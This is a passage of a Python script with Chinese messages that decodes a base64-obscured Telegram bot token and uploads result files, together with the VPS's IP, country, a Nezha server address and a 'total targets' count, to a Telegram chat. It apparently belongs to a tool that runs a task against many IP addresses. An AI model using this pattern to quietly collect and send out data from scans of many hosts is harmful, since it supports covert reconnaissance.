            BOT_TOKEN = base64.b64decode(BOT_TOKEN_B64).decode('utf-8'); CHAT_ID = base64.b64decode(CHAT_ID_B64).decode('utf-8')
        except (base64.binascii.Error, UnicodeDecodeError):
            print("\n" + "="*60 + "\n⚠️  警告: Telegram BOT_TOKEN 和 CHAT_ID 未使用 Base64 加密。\n   为了安全，建议在脚本中存储它们的 Base64 编码版本。\n" + "="*60)
            BOT_TOKEN = BOT_TOKEN_B64; CHAT_ID = CHAT_ID_B64
        def send_to_telegram(file_path, bot_token, chat_id, vps_ip, vps_country, nezha_server, total_ips, run_time):
            if not os.path.exists(file_path) or os.path.getsize(file_path) == 0: print(f"⚠️  Telegram 上传跳过：文件 {file_path} 不存在或为空"); return
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            caption = f"VPS: {vps_ip} ({vps_country})\n总目标数: {total_ips}\n总用时: {run_time}\n哪吒Server: {nezha_server}\n任务结果: {os.path.basename(file_path)}"
            with open(file_path, "rb") as f:
                try:
                    response = requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files={'document': f}, timeout=60)
                    if response.status_code == 200: print(f"✅ 文件 {file_path} 已发送到 Telegram")
                    else: print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
                except Exception as e: print(f"❌ 发送到 TG 失败：{e}")
        if BOT_TOKEN and CHAT_ID:
            vps_ip, vps_country = get_vps_info(); nezha_server = get_nezha_server()
            files_to_send = [f for f in [final_txt_file, final_xlsx_file] if os.path.exists(f) and f]
            for f in files_to_send:
                print(f"\n📤 正在将 {f} 上传至 Telegram ..."); send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country, nezha_server, total_ips, run_time_str)
